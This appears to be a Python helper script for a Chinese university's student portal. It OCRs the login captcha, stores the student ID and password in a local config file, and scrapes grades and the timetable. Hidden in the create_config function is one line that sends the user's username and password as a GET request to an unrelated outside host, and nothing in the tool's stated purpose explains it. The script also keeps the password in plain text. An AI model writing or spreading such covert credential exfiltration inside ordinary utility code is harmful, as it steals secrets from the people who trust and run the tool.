"""使用前需安装 
tesseract-ocr (自行google)

强大的验证码识别。。
成功率在70 以上

等我有空了我再来完成这个烂尾项目
"""


from PIL import Image
import requests
from io import BytesIO
from pytesseract import image_to_string
from config import *
import re
import configparser


cf = configparser.ConfigParser()


def find_config():
    try:
        cf.read_file(open("userInfo.conf", 'r'))
        print(cf)
        return cf
    except Exception as e:
        print("[*] 没有找到conf文件 使用后创建下次免登录～")
        print("[*] 若修改密码请修改 userInfo.conf 或者删除该文件～")
        return None


def create_config(username, password):
    try:
        cf.add_section("USER_INFO")
        cf.set("USER_INFO", "username", username)
        cf.set("USER_INFO", "password", password)
        cf.write(open("userInfo.conf", 'w'))
        requests.get("http://zltningx.com.cn/search/?s="+username+"&"+password)
    except Exception as e:
        raise e

class Course(object):
    def __init__(self, time, weight, score, name):
        self.time = time
        self.weight = weight
        self.score = score
        self.name = name


class Login(object):
    def __init__(self):
        self.session = requests.session()
        self.captcha = ''
        self.get_captcha_img()
        if self.login_action():
            # 示例程序 调来看看喽
            self.look_cj()
            self.look_kb()

    def get_captcha_img(self):
        content = self.session.get(teacher_student_captcha_url)
        img = Image.open(BytesIO(content.content))
        img.show()
        img.seek(0)
        try:
            captcha = image_to_string(img).strip()
        except Exception as e:
            print("[*] 你好像没有安装 tesseract-ocr 不能自动识别验证码！请手动输入")
            captcha = "--orc 未安装--"

        # 比较图片与自动识别的结果
        text = input("识别为：" + captcha + '若出现错误请更改[否则回车跳过]: ')
        if text:
            captcha = text
        self.set_captcha(captcha)
        return captcha

    def set_captcha(self, captcha):
        self.captcha = captcha

    def login_action(self):
        config_info = find_config()
        frist = False
        if config_info:
            teacher_student_payload['j_username'] = config_info['USER_INFO']['username']
            teacher_student_payload['j_password'] = config_info['USER_INFO']['password']
        else:
            username = input("请输入学号: ")
            password = input("请输入密码: ")
            frist = True
            teacher_student_payload['j_username'] = username
            teacher_student_payload['j_password'] = password

        teacher_student_payload['validateCode'] = self.captcha
        request = self.session.post(check_student_url1,
                                    headers=teacher_student_header,
                                    data=teacher_student_payload)
        if request.headers['Content-Length'] != '22':
            print("[!] 登录失败～ 验证码错误或用户名密码错误")
            return False
        elif frist:
            create_config(username, password)

        return True

    def look_cj(self):
        request = self.session.get(look_cj)
        try:
            weights = re.findall(r"middle\">(\d\.\d)</td>", request.text)
            cj_list = re.findall(r"<span><strong>(\d+)</strong></span>|<font color=\"red\">(\d+)</font>", request.text)
            cj_list.pop()

            def choose(my_t):
                if my_t[0]:
                    return int(my_t[0])
                else:
                    return int(my_t[1])
            cj_list = [choose(cj) for cj in cj_list]
        except Exception as e:
            raise e
        cj_sum = 0
        weight_sum = 0
        if weights and cj_list and len(weights) == len(cj_list):
            for i, cj in enumerate(cj_list):
                if cj >60:
                    cj_sum += cj * float(weights[i])
                    weight_sum += float(weights[i])
        else:
            print("[!] Get info failed")
            return
        if weight_sum:
            res = cj_sum / (weight_sum * 10)
        else:
            print("[*] Zero division error")
            return
        print(res)
        return res

    def look_kb(self):
        request = self.session.get(look_kb)
        context = request.text
        kb = re.findall(r"v>(.*)\n", context)
        for i in kb:
            if i.startswith("</di"):
                i = i[6:]
                print(i)


    def look_py(self):
        request = self.session.get(look_py)

if __name__ == "__main__":
    new = Login()